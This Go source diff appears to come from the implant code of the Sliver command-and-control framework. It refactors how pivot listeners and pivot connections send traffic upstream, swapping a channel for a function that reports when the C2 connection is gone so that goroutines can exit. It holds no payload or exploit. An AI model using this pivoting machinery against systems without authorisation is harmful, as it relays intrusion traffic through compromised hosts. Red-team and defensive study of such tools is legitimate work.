@@ -79,8 +79,13 @@ func generatePeerID() int64 {
 	return peerID
 }
 
+// EnvelopeSender queues an envelope for the active C2 connection. The bool is
+// false once that connection can no longer accept traffic, allowing pivot
+// producers to terminate instead of blocking forever on a retired send queue.
+type EnvelopeSender func(*pb.Envelope) bool
+
 // CreateListener - Generic interface to a start listener function
-type CreateListener func(string, chan<- *pb.Envelope, ...bool) (*PivotListener, error)
+type CreateListener func(string, EnvelopeSender, ...bool) (*PivotListener, error)
 
 // GetListeners - Get a list of active listeners
 func GetListeners() []*pb.PivotListener {
@@ -110,7 +115,7 @@ func RemoveListener(id uint32) {
 }
 
 // RestartAllListeners - Start all pivot listeners
-func RestartAllListeners(send chan<- *pb.Envelope) {
+func RestartAllListeners(send EnvelopeSender) {
 	stoppedPivotListeners.Range(func(key, value interface{}) bool {
 		stoppedListener := value.(*PivotListener)
 		if createListener, ok := SupportedPivotListeners[stoppedListener.Type]; ok {
@@ -215,7 +220,7 @@ type PivotListener struct {
 	Listener         net.Listener
 	PivotConnections *sync.Map // PeerID (int64) -> NetConnPivot
 	BindAddress      string
-	Upstream         chan<- *pb.Envelope
+	Upstream         EnvelopeSender
 	Options          []bool
 }
 
@@ -294,7 +299,7 @@ type NetConnPivot struct {
 	readDeadline     time.Duration
 	writeDeadline    time.Duration
 
-	upstream   chan<- *pb.Envelope
+	upstream   EnvelopeSender
 	Downstream chan *pb.Envelope
 }
 
@@ -362,7 +367,9 @@ func (p *NetConnPivot) Start(pivots *sync.Map) {
 					Name:   consts.SliverName,
 				})
 				envelope.Data, _ = proto.Marshal(peerEnvelope)
-				p.upstream <- envelope
+				if p.upstream == nil || !p.upstream(envelope) {
+					return
+				}
 			} else {
 				// {{if .Config.Debug}}
 				log.Printf("[pivot] received unknown message type (%d), dropping ...", envelope.Type)
@@ -376,12 +383,14 @@ func (p *NetConnPivot) Start(pivots *sync.Map) {
 		err := p.writeEnvelope(envelope)
 		if err != nil {
 			if p.downstreamPeerID != 0 {
-				p.upstream <- &pb.Envelope{
+				if p.upstream == nil || !p.upstream(&pb.Envelope{
 					Type: pb.MsgPivotPeerFailure,
 					Data: mustMarshal(&pb.PivotPeerFailure{
 						Type:   pb.PeerFailureType_DISCONNECT,
 						PeerID: p.downstreamPeerID,
 					}),
+				}) {
+					return
 				}
 			}
 			return
